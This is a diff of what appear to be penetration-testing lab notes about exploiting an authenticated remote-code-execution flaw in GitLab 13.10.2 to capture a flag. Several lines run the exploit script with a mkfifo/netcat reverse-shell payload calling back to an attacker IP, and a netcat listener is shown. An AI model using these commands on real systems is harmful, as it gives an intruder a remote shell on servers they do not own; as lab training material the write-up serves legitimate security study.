@@ -51,15 +51,14 @@ some companies are still likely using a vulnerable version.
 RCE
 {% endembed %}
 
-```shell-session
-python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
-
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&#x26;1|nc 10.10.14.15 8443 >/tmp/f '
+</strong>
 [1] Authenticating
 Successfully Authenticated
 [2] Creating Payload 
 [3] Creating Snippet and Uploading
 [+] RCE Triggered !!
-```
+</code></pre>
 
 ```shell-session
 nc -lnvp 8443
@@ -81,7 +80,20 @@ flag_gitlab.txt
 sockets
 ```
 
+## Assessment
 
+Find another valid user on the target GitLab instance.
+
+* Used .sh file to enumerate more than half an hour and got no new usernames
+* DEMO
+
+Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.
+
+```
+python3 rce.py -t http://gitlab.inlanefreight.local:8081 -u lky -p password -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 7890 >/tmp/f '
+```
+
+<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
 
 
 
